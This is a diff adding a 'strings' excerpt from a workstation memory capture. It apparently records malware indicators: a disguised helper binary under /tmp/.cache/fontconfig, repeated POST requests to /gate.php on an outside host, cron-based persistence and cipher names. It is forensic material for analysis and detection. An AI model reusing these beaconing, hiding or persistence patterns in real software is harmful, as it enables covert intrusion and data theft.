@@ -1,0 +1,51 @@
+strings excerpt: workstation-7 memory capture, region 0x7f2a4000-0x7f2a8fff
+recovered with strings -n 6, sorted by offset, excerpts only
+---
+GLIBC_2.34
+GLIBC_2.4
+/etc/ld.so.cache
+libpthread.so.0
+__libc_start_main
+updater.cfg
+Mozilla/5.0 (compatible; updater/2.1)
+/tmp/.cache/fontconfig/gnome-calc-helper
+--quiet
+fork
+setsid
+socket
+connect
+POST /gate.php HTTP/1.1
+Host: updates-eastward-cdn.net
+Content-Type: application/octet-stream
+X-Session: 8f3a91c6
+Content-Length: 284
+--
+GET /health?sid=8f3a91c6 HTTP/1.1
+Host: updates-eastward-cdn.net
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
+Cache-Control: no-cache
+--
+POST /gate.php HTTP/1.1
+Host: updates-eastward-cdn.net
+Content-Type: application/octet-stream
+X-Session: 8f3a91c6
+Content-Length: 912
+--
+apt-listchanges 3.24
+mirrors.archive-pub.org debian bookworm main
+/var/lib/apt/lists/partial
+unattended-upgrade shutdown
+--
+POST /gate.php HTTP/1.1
+Host: updates-eastward-cdn.net
+Content-Type: application/octet-stream
+X-Session: 8f3a91c6
+Content-Length: 4096
+--
+AES-256-CBC
+rc4_key_schedule
+base64_table
+/tmp/.cache/fontconfig/%s.run
+crontab -l
+/etc/cron.d/
+persistence marker ok
